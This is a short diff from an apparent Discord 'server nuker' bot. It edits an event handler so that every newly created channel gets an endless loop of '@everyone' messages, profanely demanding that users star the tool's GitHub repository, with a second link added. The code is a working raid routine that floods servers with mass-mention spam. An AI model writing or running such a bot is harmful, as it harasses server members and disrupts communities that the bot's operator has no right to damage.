@@ -102,7 +102,7 @@ async def on_command_error(ctx, error):
 @bot.event
 async def on_guild_channel_create(channel):
     while True:
-        await channel.send("@everyone star the fucking repository https://github.com/severityc/Discord-Server-Nuker")
+        await channel.send("@everyone star the fucking repository https://github.com/severityc/Discord-Server-Nuker , https://guns.lol/hooked/")
 
 
 @bot.command()
